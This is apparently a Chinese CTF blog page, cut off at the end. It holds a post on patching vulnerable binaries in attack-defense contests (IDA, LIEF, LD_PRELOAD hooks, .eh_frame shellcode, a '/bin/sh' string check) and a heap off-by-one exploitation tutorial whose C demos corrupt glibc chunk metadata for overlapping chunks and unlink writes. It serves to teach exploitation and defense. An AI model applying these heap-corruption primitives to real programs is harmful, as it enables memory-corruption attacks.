<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>IDA Pro是一个非常强大的工具，其中包含了对汇编指令修改的功能。</p>
<p>以国赛华北赛区的半决赛为例，其中有一道PWN2是一个栈溢出，代码是这样的。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-1.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-1.png" alt="img"></a></p>
<p>很显然，在read这里有一个明显的栈溢出，修复漏洞的方法也和容易，将这个值改小成0x138就好了，下面的write也一样的改法。</p>
<p>这里使用IDA默认的修改插件来改，在Edit-Patch Program目录下，首先切换到IDA View-A这个汇编指令界面，并选中要改的汇编指令行:</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-2.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-2.png" alt="img"></a></p>
<p>选择Assemble/Change byte/Change word都可以，以Assemble为例在Instruction窗口，将mov edx, 1cch改为mov edx, 138h。</p>
<p>此时，切换到类C语言窗口可以看到该行已经被修改为了read(a1, &amp;s, 0x138uLL);</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-3.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-3.png" alt="img"></a></p>
<p>但并没有完，这仅仅修改了IDA对于该文件的数据库，并没有应用到文件中去，同样在Edit-Patch Program目录下，选择Apply patches into file…，将修改写入文件，就完成了一道简单题目的patch。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-3.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-3.png" alt="img"></a></p>
<p>这种方法完全依靠手动，而且不能修改文件结构，可以供手动修改的位置也很少，一旦出现如UAF等悬垂指针的问题基本就很难解决了，还得依靠其他更有力的方法来解决。</p>
<h1 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h1><p>lief是一个开源的跨平台的可执行文件修改工具，链接如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lief-project/LIEF</span><br></pre></td></tr></table></figure>
<p>对外提供了Python、C++、C的接口。</p>
<p>对于Python库安装可以使用pip，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install lief</span><br></pre></td></tr></table></figure>
<p>对于lief的API和用法就不介绍了，RTFM。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lief.quarkslab.com/doc/latest/api/python/index.html</span><br></pre></td></tr></table></figure>
<p>以下是几种可行的patch方法</p>
<h2 id="增加segment"><a href="#增加segment" class="headerlink" title="增加segment"></a>增加segment</h2><p>这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。</p>
<p>首先我们的代码程序如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  printf(&quot;/bin/sh%d&quot;,102);</span><br><span class="line">  puts(&quot;let&apos;s go\n&quot;);</span><br><span class="line">  printf(&quot;/bin/sh%d&quot;,102);</span><br><span class="line">  puts(&quot;let&apos;s gogo\n&quot;);</span><br><span class="line">  return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们想把第一处printf修改掉，改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void myprintf(char *a,int b)&#123;</span><br><span class="line">	asm(</span><br><span class="line">		&quot;mov %rdi,%rsi\n&quot;</span><br><span class="line">		&quot;mov $0,%rdi\n&quot;</span><br><span class="line">		&quot;mov $0x20,%rdx\n&quot;</span><br><span class="line">		&quot;mov $0x1,%rax\n&quot;</span><br><span class="line">		&quot;syscall\n&quot;</span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line">void myputs(char *a)&#123;</span><br><span class="line">	asm(</span><br><span class="line">		&quot;push $0x41414141\n&quot;</span><br><span class="line">		&quot;push $0x42424242\n&quot;</span><br><span class="line">		&quot;push %rsp\n&quot;</span><br><span class="line">		&quot;pop  %rsi\n&quot;</span><br><span class="line">		&quot;mov $0,%rdi\n&quot;</span><br><span class="line">		&quot;mov $0x20,%rdx\n&quot;</span><br><span class="line">		&quot;mov $0x1,%rax\n&quot;</span><br><span class="line">		&quot;syscall\n&quot;</span><br><span class="line">		&quot;pop %rax\n&quot;</span><br><span class="line">		&quot;pop %rax\n&quot;</span><br><span class="line">		);</span><br><span class="line">&#125;</span><br><span class="line">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br></pre></td></tr></table></figure>
<p>如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。</p>
<p>patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。</p>
<p>lief中提供了add参数可以用于为二进制文件增加段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binary    = lief.parse(binary_name)</span><br><span class="line">lib  = lief.parse(lib_name)	</span><br><span class="line">segment_add = binary.add(lib.segments[0])</span><br></pre></td></tr></table></figure>
<p>在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr</p>
<p>因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call xxx  =(addr of new segment + offset function ) -  (addr of order + 5 /*length of call xx*/)</span><br></pre></td></tr></table></figure>
<p>由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch计算函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def patch_call(file,where,end,arch = &quot;amd64&quot;):</span><br><span class="line">	print hex(end)</span><br><span class="line"></span><br><span class="line">	length = p32((end - (where + 5 )) &amp; 0xffffffff)</span><br><span class="line">	order = &apos;\xe8&apos;+length</span><br><span class="line">	print disasm(order,arch=arch)</span><br><span class="line">	file.patch_address(where,[ord(i) for i in order])</span><br></pre></td></tr></table></figure>
<p>执行之后可以看到patch成功了，</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-5.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-5.png" alt="img"></a></p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-6.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-6.png" alt="img"></a></p>
<p>但是一个重大的问题是patch前后文件大小改动很大：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/patch] - [一 7月 02, 20:36]</span><br><span class="line">└─[$] &lt;&gt; python 1.py</span><br><span class="line">0x8022f9</span><br><span class="line">   0:   e8 70 1d 40 00          call   0x401d75</span><br><span class="line">[+] ori size 8656</span><br><span class="line">[+] patch size 15885</span><br><span class="line">[+] Seccessful patched in adding segment</span><br></pre></td></tr></table></figure>
<p>这样在一些线下赛中很容易由于修改过大和被判定为通防或者宕机。</p>
<h2 id="增加library"><a href="#增加library" class="headerlink" title="增加library"></a>增加library</h2><p>这是借鉴LD_preload的一种思路，当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。如下例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;/bin/sh%d&quot;, 102LL, envp, argv);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译一个动态链接库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//#include &quot;/home/p4nda/linux-4.17.3/lib/syscall.c&quot;</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">//#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">// gcc -nostdlib  -nodefaultlibs -fPIC -Wl,-shared patch.c -o patch -ldl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int printf(char *a,int b) &#123;</span><br><span class="line">	char str[] = &quot;hacked by me\n &quot;;</span><br><span class="line">	//puts(a);</span><br><span class="line">	if(strstr(a,&quot;/bin/sh&quot;))&#123;</span><br><span class="line">		puts(&quot;find dangerous str~&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	int (*old_printf)(char *,int);</span><br><span class="line">	old_printf =(int (*)(char *,int)) dlsym(RTLD_NEXT, &quot;printf&quot;);</span><br><span class="line">	old_printf(a,b); </span><br><span class="line">	puts(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译命令在注释中，则每次printf时都会先执行上述库中的函数，达到hook的目的。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-7.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-7.png" alt="img"></a></p>
<p>优势很明显，可以执行任意libc内函数代码，让编程更容易。</p>
<p>不过缺点也很明显，首先程序变得<strong>巨大</strong>，并且当不存在这个静态链接库的时候，程序跑不起来… 有些线下赛都是本地check的，比如*网杯，很容易就判断宕机了…</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-8.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-8.png" alt="img"></a></p>
<h2 id="修改程序-eh-frame段"><a href="#修改程序-eh-frame段" class="headerlink" title="修改程序.eh_frame段"></a>修改程序.eh_frame段</h2><p>在TSCTF 2018 Final时，我在NeSE战队的binary文件中找到了通防工具，但是程序改动并没有特别大，当时感觉很好奇，在赛后调试了一下，发现他们把通防的shellcode写在了一个叫.eh_frame的段中，这个段会加载到程序中来，并且自身带有可执行权限，在查找这个段用处时，发现该段对程序执行影响不大，故可以将patch代码写在这个段中，再用跳转的方法将程序逻辑劫持到这里来。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-10.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-10.png" alt="img"></a></p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-11.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-11.png" alt="img"></a></p>
<p>可以看到在patch前后，程序大小保持不变。</p>
<p><a href="http://p4nda.top/img/patch-in-pwn/1-9.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/patch-in-pwn/1-9.png" alt="img"></a></p>
<p>缺点同样明显，.eh_frame的大小是有限的…</p>
<p>综上，似乎没有比较简洁的通用方法，综合着来用吧….</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.115Z"><a href="/2018/10/21/offbyone/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/offbyone/">off-by-one</a></h1>
  

    </header>
    <div class="entry">
      
        <p>一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-by-one利用也出现在国内外的各类CTF竞赛中，但是在网络上还不能找到一篇系统的介绍堆off-by-one利用的教程。在这篇文章中我列出了5种常见的堆上的off-by-one攻击方式，并且给出了测试DEMO，测试的环境均为x86。</p>
<h1 id="达成漏洞利用的条件"><a href="#达成漏洞利用的条件" class="headerlink" title="达成漏洞利用的条件"></a>达成漏洞利用的条件</h1><pre><code>off-by-one并不是全都可以达到利用的目的的。首先就要求堆必须以要求的size+0x4字节（x86）的大小进行分配。如果不满足这个条件那么就无法覆盖到inuse位了。这个是由于堆的字节对齐机制造成的，简单的说堆块是以8字节进行对齐的（x64为16字节）。如果malloc(1024)，那么实际会分配1024+8=1032字节，这一点很好理解。但是如果是malloc(1020)呢，1020+8=1028字节，而1028不满足8字节对齐，那么实际只会分配1020+4=1024字节，多出的4个字节由下一块的prev_size提供空间。
而对于触发unlink的操作来说，还需要一个额外的附加条件。因为现在的unlink是有检验的，所以需要一个指向堆上的指针才可以。
</code></pre><h1 id="漏洞利用的效果"><a href="#漏洞利用的效果" class="headerlink" title="漏洞利用的效果"></a>漏洞利用的效果</h1><p>off-by-one能达到什么利用效果呢？<br>这个是很关键的问题。根据分类来看可以实现两种效果</p>
<h2 id="1-chunk-overlapping"><a href="#1-chunk-overlapping" class="headerlink" title="1.chunk overlapping"></a>1.chunk overlapping</h2><pre><code>所谓的chunk overlapping是指，
针对一个目标堆块。我们可以通过一些操作，
使这个目标堆块被我们重新分配到某个我们控制的新的堆块中，
这样就可以对目标堆块进行任意的读写了。
</code></pre><h2 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h2><pre><code>这种off-by-one造成的unlink的利用效果其实和溢出造成的unlink的利用效果是一致的。
对于small bin可以使指向堆的指针ptr的值变为&amp;ptr-0xc，
这样再结合一系列的操作就可以达成几乎无限次的write-anything-anywhere了。
</code></pre><p>而large bin的unlink则可以实现一次任意地址写（write-anything-anywhere）。</p>
<h1 id="堆块格式"><a href="#堆块格式" class="headerlink" title="堆块格式"></a>堆块格式</h1><p>inuse()：仅通过下一块的inuse位来判定当前块是否使用.</p>
<p>prev_chunk()：如果前一个块为空，那么进行空块合并时，仅使用本块的prev_size来寻找前块的头。</p>
<p>next_chunk()：仅通过本块头+本块大小的方式来寻找下一块的头</p>
<p>chunksize()：仅通过本块的size确定本块的大小。</p>
<h1 id="达成漏洞利用的具体操作"><a href="#达成漏洞利用的具体操作" class="headerlink" title="达成漏洞利用的具体操作"></a>达成漏洞利用的具体操作</h1><h2 id="off-by-one-overwrite-allocated"><a href="#off-by-one-overwrite-allocated" class="headerlink" title="off-by-one overwrite allocated"></a>off-by-one overwrite allocated</h2><p>在这种情况下堆块布局是这样的</p>
<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|<br>    A是发生有off-by-one的堆块，<br>    其中B和C是allocated状态的块。而且C是我们的攻击目标块。<br>    我们的目标是能够读写块C，<br>    那么就应该去构造出这样的内存布局。<br>    然后通过off-by-one去改写块B的size域<br>    （注意要保证inuse域的值为1，否则会触发unlink导致crash）<br>    以实现把C块给整个包含进来。通过把B给free掉，<br>    然后再allocated一个大于B+C的块就可以返回B的地址，并且可以读写块C了。</p>
<p>具体的操作是：</p>
<ol>
<li><p>构成图示的内存布局</p>
</li>
<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
</li>
<li><p>free掉B块</p>
</li>
<li><p>malloc一个B+C大小的块</p>
</li>
<li><p>通过返回的地址即可对C任意读写</p>
</li>
</ol>
<pre><code>注意，必须要把C块整个包含进来，否则free时会触发check
，导致抛出错误。因为ptmalloc实现时的验证逻辑是
当前块的下一块的inuse必须为1，否则在free时会触发异常，
这一点本来是为了防止块被double free而做的限制，却给我们伪造堆块造成了障碍。
</code></pre><h2 id="off-by-one-overwrite-freed"><a href="#off-by-one-overwrite-freed" class="headerlink" title="off-by-one overwrite freed"></a>off-by-one overwrite freed</h2><p>在这种情况下堆块布局依然是这样的</p>
<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
<pre><code>A是发生有off-by-one的堆块，
其中B是free状态的块,C是allocated块。而且C是我们的攻击目标块。
我们的目标是能够读写块C，
那么就应该去构造出这样的内存布局。
然后通过off-by-one去改写块B的size域（注意要保证inuse域的值为1）
以实现把C块给整个包含进来。但是这种情况下的B是free状态的,
通过增大B块包含C块，
然后再allocated一个B+C尺寸的堆块就可以返回B的地址，并且可以读写块C了。
</code></pre><p>具体的操作是：</p>
<ol>
<li><p>构成图示的内存布局</p>
</li>
<li><p>off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)</p>
</li>
<li><p>malloc一个B+C大小的块</p>
</li>
<li><p>通过返回的地址即可对C任意读写</p>
</li>
</ol>
<h2 id="off-by-one-null-byte"><a href="#off-by-one-null-byte" class="headerlink" title="off-by-one null byte"></a>off-by-one null byte</h2><pre><code>这种情况就与上面两种有所不同了，
在这种情况下溢出的这个字节是一个&apos;\x00&apos;字节。
这种off-by-one可能是最为常见的
相比于前两种，这种利用方式就显得更复杂，而且对内存布局的要求也更高了。
</code></pre><p>首先内存布局需要三个块</p>
<p>|——————————————————————|<br>|   A   |  B  |    C   |<br>|——————————————————————|</p>
<pre><code>其中A,B,C都是allocated块，A块发生了null byte off-by-one,
覆盖了B块的inuse位，使B块伪造为空。
然后在分配两个稍小的块b1、b2，根据ptmalloc的实现，
这两个较小块（不能是fastbin）会分配在B块中。
然后只要释放掉b1，再释放掉C，就会引发从原B块到C的合并。
那么只要重新分配原B大小的chunk，就会重新得到b2。
在这个例子中，b2是我们要进行读写的目标堆块。最后的堆块布局如下所示：
</code></pre><p>|——————————————————————|<br>|   A |B1|B2| |    C   |<br>|——————————————————————|<br>布局堆块结构如ABC所示</p>
<ol>
<li><p>off-by-one覆盖B，目的是覆盖掉B的inuse位</p>
</li>
<li><p>free B</p>
</li>
<li><p>malloc b1,malloc b2</p>
</li>
<li><p>free C</p>
</li>
<li><p>free b1</p>
</li>
<li><p>malloc B</p>
</li>
<li><p>overlapping b2</p>
</li>
</ol>
<p>这种利用方式成功的原因有两点:</p>
<p>通过prev_chunk()宏查找前块时没有对size域进行验证</p>
<p>当B块的size域被伪造后，下一块的pre_size域无法得到更新。</p>
<h1 id="off-by-one-small-bin"><a href="#off-by-one-small-bin" class="headerlink" title="off-by-one small bin"></a>off-by-one small bin</h1><p>|——————————————————————|<br>|   A      |     B     |<br>|——————————————————————|</p>
<pre><code>这种方法是要触发unlink宏，
因此需要一个指向堆上的指针来绕过fd和bk链表的check。
需要在A块上构造一个伪堆结构，
然后覆盖B的pre_size域和inuse域。这样当我们free B时，
就会触发unlink宏导致指向堆上的指针
ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。
通过这个特点，我们可以覆写ptr指针，如果条件允许的话，
几乎可以造成无限次的write-anything-anywhere。
</code></pre><ol>
<li><p>在A块中构造伪small bin结构，并且修改B块的prev_size域和inuse域。</p>
</li>
<li><p>free B块</p>
</li>
<li><p>ptr指针被改为&amp;ptr-0xC</p>
</li>
</ol>
<h2 id="off-by-one-large-bin"><a href="#off-by-one-large-bin" class="headerlink" title="off-by-one large bin"></a>off-by-one large bin</h2><p>large bin通过unlink造成write-anything-anywhere的利用方法最早出现于Google的Project Zero项目的一篇文章中，具体链接是</p>
<p><a href="https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html</a></p>
<p>在这篇文章中，提出了large bin检验仅仅是通过assert断言的形式来进行的，并不能真正的对漏洞进行有效的防护。但是经过我的测试发现，目前版本的ubuntu和CentOS已经均具备有检测large unlink的能力，如果发现存在指针被篡改的情况，则会抛出“corrupted double-linked list(not small)”的错误，之后翻阅了一下glibc中ptmalloc部分的实现代码却并没有发现有检测这部分的代码，猜测大概是后续版本中加入的。因为这种利用方式的意义已经不是很大，这里就不在详细列出步骤也不提供测试DEMO了。</p>
<h1 id="测试DEMO"><a href="#测试DEMO" class="headerlink" title="测试DEMO"></a>测试DEMO</h1><h1 id="1-off-by-one-overwrite-allocated"><a href="#1-off-by-one-overwrite-allocated" class="headerlink" title="1.off-by-one overwrite allocated"></a>1.off-by-one overwrite allocated</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';  //把C块包含进来</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码演示了通过off-by-one对C块实施了overlapping。通过返回的变量Overlapped就可以对C块进行任意的读写了。</p>
<h2 id="2-off-by-one-overwrite-freed"><a href="#2-off-by-one-overwrite-freed" class="headerlink" title="2.off-by-one overwrite freed"></a>2.off-by-one overwrite freed</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *Overlapped;</span><br><span class="line">     </span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">252</span>);</span><br><span class="line">    buf[252]='\x89';</span><br><span class="line">    <span class="built_in">memcpy</span>(A,buf,<span class="number">253</span>);<span class="comment">//A存在off-by-one漏洞</span></span><br><span class="line">   </span><br><span class="line">    Overlapped=<span class="built_in">malloc</span>(<span class="number">380</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个DEMO与上面的类似，同样可以overlapping后面的块C，导致可以对C进行任意读写。</p>
<h2 id="3-off-by-one-null-byte"><a href="#3-off-by-one-null-byte" class="headerlink" title="3.off-by-one null byte"></a>3.off-by-one null byte</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *A,*B,*C;</span><br><span class="line">    <span class="keyword">void</span> *B1,*B2;</span><br><span class="line">    <span class="keyword">void</span> *Overlapping;</span><br><span class="line">    A=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B=<span class="built_in">malloc</span>(<span class="number">0x208</span>);</span><br><span class="line">    C=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    ((char *)A)[0x104]='\x00';</span><br><span class="line">    B1=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    B2=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(B1);</span><br><span class="line">    <span class="built_in">free</span>(C);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以成功的对B2进行任意读写。</p>
<h2 id="4-off-by-one-small-bin"><a href="#4-off-by-one-small-bin" class="headerlink" title="4.off-by-one small bin"></a>4.off-by-one small bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> prev_size,size,fd,bk;</span><br><span class="line">    <span class="keyword">void</span> *p1,*p2;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">253</span>]=<span class="string">""</span>;</span><br><span class="line">   </span><br><span class="line">    p1=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">    p2=<span class="built_in">malloc</span>(<span class="number">252</span>);</span><br><span class="line">   </span><br><span class="line">    ptr=p1;</span><br><span class="line">    prev_size=<span class="number">0</span>;</span><br><span class="line">    size=<span class="number">249</span>;</span><br><span class="line">    fd=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0xC</span>;</span><br><span class="line">    bk=(<span class="keyword">int</span>)(&amp;ptr)<span class="number">-0x8</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'c'</span>,<span class="number">253</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,&amp;prev_size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">4</span>,&amp;size,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">8</span>,&amp;fd,<span class="number">4</span>);</span><br><span class="line">    <span 